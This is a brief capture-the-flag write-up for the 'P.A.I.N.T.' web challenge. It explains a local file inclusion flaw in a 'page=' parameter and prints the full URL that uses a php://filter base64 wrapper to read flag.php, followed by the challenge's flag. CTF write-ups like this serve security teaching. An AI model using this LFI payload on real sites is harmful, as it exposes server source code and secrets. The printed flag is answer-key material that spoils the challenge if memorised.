# P.A.I.N.T.: Professional Arctic Interactive NT drawing service (web 50)

The `page=` paramter hints that the challenge has LFI. Using a PHP wrapper, we can read the flag.php file directly.

http://challs.xmas.htsp.ro:6004/?page=php://filter/convert.base64-encode/resource=flag.php

## Flag
`X-MAS{P41NT_W4R??_IT'S_LIK3_4n_3d1t_w4r,bu7_w1th_p1x3l5_30c1n98c}`
